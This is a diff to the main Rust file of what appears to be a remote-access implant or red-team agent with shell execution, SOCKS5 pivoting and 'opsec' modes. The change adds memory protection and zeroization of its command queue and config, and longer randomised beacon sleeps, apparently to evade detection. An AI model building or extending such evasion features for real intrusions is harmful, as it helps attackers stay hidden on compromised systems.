@@ -1,26 +1,34 @@
 mod commands;
 mod config;
+mod dormant;
 mod networking;
 mod opsec;
+mod util;
 
 use crate::commands::command_shell::run_shell;
 use crate::config::AgentConfig;
-use std::env;
-use std::time::Duration;
-use tokio::time;
-use rand::Rng;
-use log::{info, warn, error, debug};
+use crate::dormant::MemoryProtector;
+use crate::dormant::SensitiveState;
 use crate::networking::socks5_pivot::Socks5PivotHandler;
 use crate::networking::socks5_pivot_server::Socks5PivotServer;
-use std::sync::Arc;
-use once_cell::sync::Lazy;
-use std::sync::Mutex;
 use crate::opsec::{OpsecLevel, AgentMode, determine_agent_mode, OPSEC_STATE};
+use crate::util::random_jitter;
+use log::{info, warn, error, debug};
+use once_cell::sync::Lazy;
+use rand::Rng;
+use std::env;
+use std::sync::Arc;
+use std::sync::Mutex;
+use std::time::Duration;
+use tokio::time;
 
-fn random_jitter(base: u64, jitter: u64) -> u64 {
-    let mut rng = rand::thread_rng(); // (or rand::rng() if using latest rand)
-    base + rng.gen_range(0..=jitter) // (or rng.random_range(0..=jitter))
-}
+static MEMORY_PROTECTOR: Lazy<Mutex<MemoryProtector>> = Lazy::new(|| {
+    Mutex::new(MemoryProtector::new(SensitiveState {
+        command_queue: Vec::new(),
+        file_buffer: Vec::new(),
+        config: None,
+    }))
+});
 
 // Dormant startup function
 // This function is called on Windows to wait for the system to be idle before starting the agent
@@ -98,6 +106,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 info!("[OPSEC] Mode transition: {:?} -> {:?}", state.mode, new_mode);
                 state.mode = new_mode;
                 state.last_transition = std::time::Instant::now();
+                on_mode_transition(new_mode);
             } else {
                 debug!("[OPSEC] Mode unchanged: {:?}", state.mode);
             }
@@ -122,11 +131,24 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
         
         let (base, jitter) = match new_mode {
-            AgentMode::FullOpsec => (600, 120),         // 10-12 min
-            AgentMode::BackgroundOpsec => (60, 30),     // 1-1.5 min
+            AgentMode::FullOpsec => (900, 1800),         // 15–45 min
+            AgentMode::BackgroundOpsec => (120, 180),     // 2–5 min
         };
         let sleep_time = random_jitter(base, jitter);
         info!("[OPSEC] Sleeping for {} seconds (mode: {:?})", sleep_time, new_mode);
         tokio::time::sleep(std::time::Duration::from_secs(sleep_time)).await;
     }
+}
+
+fn on_mode_transition(new_mode: AgentMode) {
+    let mut protector = MEMORY_PROTECTOR.lock().unwrap();
+    match new_mode {
+        AgentMode::FullOpsec => protector.protect(),
+        AgentMode::BackgroundOpsec => protector.unprotect(),
+    }
+}
+
+fn cleanup() {
+    let mut protector = MEMORY_PROTECTOR.lock().unwrap();
+    protector.zeroize();
 }
